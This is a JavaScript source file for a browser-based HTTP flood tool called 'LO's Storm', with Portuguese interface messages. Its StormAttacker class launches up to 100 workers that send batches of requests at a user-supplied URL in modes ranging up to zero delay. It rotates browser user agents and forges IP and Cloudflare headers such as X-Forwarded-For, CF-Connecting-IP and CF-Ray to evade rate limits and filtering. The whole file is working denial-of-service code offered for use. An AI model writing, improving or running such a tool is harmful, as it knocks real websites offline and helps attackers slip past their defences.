// ==================== CONFIGURATION ====================
const CONFIG = {
    WORKERS_PER_CONNECTION: 5000,
    MAX_CONCURRENT_CONNECTIONS: 100,
    REQUEST_TIMEOUT: 10000,
    RETRY_ATTEMPTS: 3,
    
    ATTACK_MODES: {
        extreme: { requestsPerWorker: 5000, batchSize: 100, delay: 0 },
        heavy:   { requestsPerWorker: 3000, batchSize: 75,  delay: 10 },
        medium:  { requestsPerWorker: 1500, batchSize: 50,  delay: 50 },
        light:   { requestsPerWorker: 500,  batchSize: 25,  delay: 100 }
    },
    
    BROWSERS: {
        chrome: {
            name: 'Chrome',
            userAgents: [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
            ],
            acceptHeader: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        },
        firefox: {
            name: 'Firefox',
            userAgents: [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:126.0) Gecko/20100101 Firefox/126.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0'
            ],
            acceptHeader: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
        },
        safari: {
            name: 'Safari',
            userAgents: [
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1'
            ],
            acceptHeader: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        },
        edge: {
            name: 'Edge',
            userAgents: [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0'
            ],
            acceptHeader: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        }
    }
};

// ==================== UTILITY FUNCTIONS ====================
class Utils {
    static generateFakeIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }
    
    static generateRandomString(length) {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }
    
    static generateRandomHex(length) {
        const chars = '0123456789abcdef';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }
    
    static formatNumber(num) {
        return new Intl.NumberFormat().format(num);
    }
    
    static formatBytes(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }
    
    static getTimestamp() {
        const now = new Date();
        return `[${now.toLocaleTimeString()}.${now.getMilliseconds().toString().padStart(3, '0')}]`;
    }
}

// ==================== BROWSER FINGERPRINT GENERATOR ====================
class BrowserFingerprint {
    constructor(enabledBrowsers) {
        this.enabledBrowsers = enabledBrowsers;
        this.browsers = Object.keys(CONFIG.BROWSERS)
            .filter(key => enabledBrowsers[key])
            .map(key => CONFIG.BROWSERS[key]);
    }
    
    getRandomBrowser() {
        if (this.browsers.length === 0) return CONFIG.BROWSERS.chrome;
        return this.browsers[Math.floor(Math.random() * this.browsers.length)];
    }
    
    generateHeaders(targetUrl) {
        const browser = this.getRandomBrowser();
        const userAgent = browser.userAgents[Math.floor(Math.random() * browser.userAgents.length)];
        
        const ip1 = Utils.generateFakeIP();
        const ip2 = Utils.generateFakeIP();
        const ip3 = Utils.generateFakeIP();
        
        return {
            'User-Agent': userAgent,
            'Accept': browser.acceptHeader,
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'X-Forwarded-For': `${ip1}, ${ip2}, ${ip3}`,
            'X-Real-IP': ip1,
            'X-Client-IP': ip2,
            'X-Remote-IP': ip3,
            'CF-Connecting-IP': ip1,
            'True-Client-IP': ip2,
            'CF-IPCountry': ['US', 'GB', 'CA', 'DE', 'FR'][Math.floor(Math.random() * 5)],
            'CF-Ray': Utils.generateRandomHex(16) + '-SJC',
            'CF-Visitor': JSON.stringify({scheme: 'https'}),
            'Referer': ['https://www.google.com/', 'https://www.bing.com/', 'https://www.facebook.com/'][Math.floor(Math.random() * 3)]
        };
    }
}

// ==================== STATISTICS MANAGER ====================
class StatisticsManager {
    constructor() {
        this.reset();
    }
    
    reset() {
        this.totalRequests = 0;
        this.successfulRequests = 0;
        this.failedRequests = 0;
        this.responseCodes = {};
        this.activeWorkers = 0;
        this.bytesSent = 0;
        this.bytesReceived = 0;
        this.startTime = Date.now();
        this.lastUpdate = Date.now();
        this.lastRequestCount = 0;
    }
    
    recordRequest(success, statusCode, bytesSent = 0, bytesReceived = 0) {
        this.totalRequests++;
        this.bytesSent += bytesSent;
        this.bytesReceived += bytesReceived;
        
        if (success) this.successfulRequests++;
        else this.failedRequests++;
        
        if (statusCode) {
            this.responseCodes[statusCode] = (this.responseCodes[statusCode] || 0) + 1;
        }
    }
    
    incrementWorkers() { this.activeWorkers++; }
    decrementWorkers() { this.activeWorkers = Math.max(0, this.activeWorkers - 1); }
    
    getCurrentRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastUpdate) / 1000;
        const requestDiff = this.totalRequests - this.lastRequestCount;
        this.lastUpdate = now;
        this.lastRequestCount = this.totalRequests;
        return timeDiff > 0 ? Math.round(requestDiff / timeDiff) : 0;
    }
    
    getBandwidth() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        return elapsed > 0 ? this.bytesSent / elapsed : 0;
    }
    
    getStats() {
        return {
            total: this.totalRequests,
            successful: this.successfulRequests,
            failed: this.failedRequests,
            responseCodes: this.responseCodes,
            activeWorkers: this.activeWorkers,
            rps: this.getCurrentRPS(),
            bandwidth: this.getBandwidth(),
            bytesSent: this.bytesSent,
            bytesReceived: this.bytesReceived
        };
    }
}

// ==================== MAIN ATTACKER CLASS ====================
class StormAttacker {
    constructor() {
        this.isRunning = false;
        this.workers = [];
        this.stats = new StatisticsManager();
        this.fingerprint = null;
        this.logElement = null;
        this.statsElements = {};
    }
    
    log(message, type = 'info') {
        if (!this.logElement) return;
        const timestamp = Utils.getTimestamp();
        const color = type === 'success' ? '#22c55e' : type === 'error' ? '#ef4444' : '#a5b4fc';
        this.logElement.innerHTML += `<span style="color:${color}">${timestamp} ${message}</span><br>`;
        this.logElement.scrollTop = this.logElement.scrollHeight;
    }
    
    updateStats() {
        const s = this.stats.getStats();
        if (this.statsElements.total) this.statsElements.total.textContent = Utils.formatNumber(s.total);
        if (this.statsElements.success) this.statsElements.success.textContent = Utils.formatNumber(s.successful);
        if (this.statsElements.failed) this.statsElements.failed.textContent = Utils.formatNumber(s.failed);
        if (this.statsElements.rps) this.statsElements.rps.textContent = Utils.formatNumber(s.rps);
        if (this.statsElements.bandwidth) this.statsElements.bandwidth.textContent = Utils.formatBytes(s.bandwidth) + '/s';
        if (this.statsElements.workers) this.statsElements.workers.textContent = s.activeWorkers;
    }
    
    async sendRequest(targetUrl, headers) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), CONFIG.REQUEST_TIMEOUT);
            
            const response = await fetch(targetUrl, {
                method: 'GET',
                headers: headers,
                mode: 'no-cors',
                cache: 'no-cache',
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            this.stats.recordRequest(true, response.status || 200, 0, 0);
            return true;
        } catch (e) {
            this.stats.recordRequest(false, null, 0, 0);
            return false;
        }
    }
    
    createWorker(targetUrl, mode) {
        const worker = {
            id: Utils.generateRandomString(8),
            running: true,
            count: 0
        };
        
        this.workers.push(worker);
        this.stats.incrementWorkers();
        
        const attackConfig = CONFIG.ATTACK_MODES[mode];
        
        const run = async () => {
            while (worker.running && this.isRunning) {
                const headers = this.fingerprint.generateHeaders(targetUrl);
                
                for (let i = 0; i < attackConfig.batchSize; i++) {
                    if (!worker.running || !this.isRunning) break;
                    await this.sendRequest(targetUrl, headers);
                    worker.count++;
                }
                
                if (attackConfig.delay > 0) {
                    await new Promise(r => setTimeout(r, attackConfig.delay));
                }
            }
            this.stats.decrementWorkers();
        };
        
        run();
    }
    
    start(targetUrl, mode, enabledBrowsers) {
        if (this.isRunning) return;
        
        this.isRunning = true;
        this.stats.reset();
        this.fingerprint = new BrowserFingerprint(enabledBrowsers);
        this.workers = [];
        
        this.log(`Iniciando ataque em ${targetUrl} no modo ${mode.toUpperCase()}`, 'success');
        
        const numWorkers = Math.min(CONFIG.MAX_CONCURRENT_CONNECTIONS, CONFIG.WORKERS_PER_CONNECTION);
        
        for (let i = 0; i < numWorkers; i++) {
            this.createWorker(targetUrl, mode);
        }
        
        this.updateInterval = setInterval(() => this.updateStats(), 300);
    }
    
    stop() {
        this.isRunning = false;
        this.workers.forEach(w => w.running = false);
        clearInterval(this.updateInterval);
        this.log('Ataque parado pelo usuário.', 'error');
        this.updateStats();
    }
}

// ==================== INITIALIZATION ====================
document.addEventListener('DOMContentLoaded', () => {
    const attacker = new StormAttacker();
    
    attacker.logElement = document.getElementById('log');
    attacker.statsElements = {
        total: document.getElementById('total'),
        success: document.getElementById('success'),
        failed: document.getElementById('failed'),
        rps: document.getElementById('rps'),
        bandwidth: document.getElementById('bandwidth'),
        workers: document.getElementById('workers')
    };
    
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const targetInput = document.getElementById('targetUrl');
    const modeSelect = document.getElementById('attackMode');
    
    const getEnabledBrowsers = () => ({
        chrome: document.getElementById('chrome').checked,
        firefox: document.getElementById('firefox').checked,
        safari: document.getElementById('safari').checked,
        edge: document.getElementById('edge').checked
    });
    
    startBtn.addEventListener('click', () => {
        const url = targetInput.value.trim();
        if (!url) {
            attacker.log('Por favor, insira uma URL válida.', 'error');
            return;
        }
        
        const mode = modeSelect.value;
        const browsers = getEnabledBrowsers();
        
        startBtn.disabled = true;
        stopBtn.disabled = false;
        
        attacker.start(url, mode, browsers);
    });
    
    stopBtn.addEventListener('click', () => {
        attacker.stop();
        startBtn.disabled = false;
        stopBtn.disabled = true;
    });
    
    // Log inicial
    attacker.log('LO\'s Storm carregado. Pronto para destruir. ❤️', 'success');
});
